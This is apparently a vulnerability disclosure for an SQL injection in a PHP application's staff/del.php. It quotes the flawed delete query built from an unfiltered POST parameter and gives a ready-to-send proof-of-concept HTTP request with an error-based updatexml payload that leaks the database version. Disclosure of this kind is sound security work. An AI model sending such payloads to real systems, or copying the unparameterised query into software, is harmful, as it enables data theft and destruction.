### Vulnerability file address

`staff/del.php` from line 7

The incoming $M_Id variable is not filtered, there is sql injection

```php
......
......
......
  if (isset($_POST['delete'])) {
    $M_Id = $_POST['M_Id'];
    echo $sql = "DELETE FROM `message` WHERE M_Id = $M_Id ";
    $con->query($sql) or die($con->error);


    echo header("Location: ../staff/recieve.php")  ;
  }
......
......
......
```

### POC

not exists any precondition

```http
POST /staff/del.php HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

delete=&M_Id=1+and+(updatexml(1,concat(0x7e,(select version()),0x7e),1))+%23
```

### Attack results pictures

![image-20220702215401892](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702215401.png)

